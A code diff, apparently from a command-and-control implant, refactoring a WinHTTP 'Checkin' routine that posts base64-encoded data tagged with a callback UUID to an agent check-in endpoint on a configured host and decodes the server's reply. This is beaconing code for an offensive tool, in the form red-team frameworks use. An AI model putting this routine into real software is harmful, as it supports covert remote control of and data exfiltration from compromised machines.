@@ -160,75 +160,76 @@ e_func:
 // Full-established checkin
 std::string CommManager::Checkin(const std::string& json)
 {
-    HINTERNET hSession = NULL;
-    HINTERNET hConnect = NULL;
-    HINTERNET hRequest = NULL;
-
-    DWORD dwSize = 0;
-    DWORD dwDownloaded = 0;
-    DWORD dwOptionalLength = 0;
-
-    std::string result;
-    std::string strData;
-
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    DWORD dwSize = 0, dwDownloaded = 0, dwOptionalLength = 0;
+    std::string result, strData;
     BOOL bResults = FALSE;
-    LPVOID lpOptional = NULL;
+    LPSTR buffer = NULL;
+    LPVOID lpOptional;
 
     hSession = WinHttpOpen(
         TO_WIDE_STRING(COMM_USER_AGENT),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) goto e_func;
+
+    hConnect = WinHttpConnect(hSession, host.c_str(), COMM_PORT, 0);
+    if (!hConnect) goto e_func;
+
+    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) goto e_func;
+
+    strData = base64::to_base64(callbackUUID + json);
+    lpOptional = (LPVOID)strData.c_str();
+    dwOptionalLength = (DWORD)strData.length();
+
+    bResults = WinHttpSendRequest(
+        hRequest,
+        TO_WIDE_STRING("Content-Type: application/json"),
+        (DWORD)-1L,
+        lpOptional,
+        dwOptionalLength,
+        dwOptionalLength,
         0);
+    if (!bResults) goto e_func;
 
-    if (!hSession)
-        goto e_func;
+    if (WinHttpReceiveResponse(hRequest, NULL))
+    {
+        std::vector<char> totalResponse; // Persistent container for all chunks
+        std::vector<char> chunkBuffer;   // Temporary container for each chunk
 
-	if (WinHttpReceiveResponse(hRequest, NULL))
-	{
-		std::vector<char> totalResponse; // Persistent container for all chunks
-		std::vector<char> chunkBuffer;   // Temporary container for each chunk
+        do {
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+            if (dwSize == 0) break;
 
-		do {
-			dwSize = 0;
-			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
-			if (dwSize == 0) break;
+            // Prepare temporary buffer for this chunk
+            chunkBuffer.resize(dwSize);
+            dwDownloaded = 0;
 
-			// Prepare temporary buffer for this chunk
-			chunkBuffer.resize(dwSize);
-			dwDownloaded = 0;
+            if (!WinHttpReadData(hRequest, chunkBuffer.data(), dwSize, &dwDownloaded)) break;
 
-			if (!WinHttpReadData(hRequest, chunkBuffer.data(), dwSize, &dwDownloaded)) break;
+            // Append only the bytes that were actually downloaded, ignoring uninitialized padding
+            if (dwDownloaded > 0) {
+                totalResponse.insert(totalResponse.end(), chunkBuffer.begin(), chunkBuffer.begin() + dwDownloaded);
+            }
 
-			// Append only the bytes that were actually downloaded, ignoring uninitialized padding
-			if (dwDownloaded > 0) {
-				totalResponse.insert(totalResponse.end(), chunkBuffer.begin(), chunkBuffer.begin() + dwDownloaded);
-			}
+        } while (dwSize > 0);
 
-		} while (dwSize > 0);
+        if (totalResponse.empty()) goto e_func;
 
-		if (totalResponse.empty()) goto e_func;
-
-		// Convert the validated binary data into a string and decode base64
-		result = base64::from_base64(std::string(totalResponse.begin(), totalResponse.end()));
-	}
+        // Convert the validated binary data into a string and decode base64
+        result = base64::from_base64(std::string(totalResponse.begin(), totalResponse.end()));
+    }
 
 
 e_func:
-    if (hRequest)
-        WinHttpCloseHandle(hRequest);
-
-    if (hConnect)
-        WinHttpCloseHandle(hConnect);
-
-    if (hSession)
-        WinHttpCloseHandle(hSession);
-
-    if (result.rfind(callbackUUID, 0) == 0)
-        result.erase(0, callbackUUID.length());
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
 
     return result;
 }
-
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
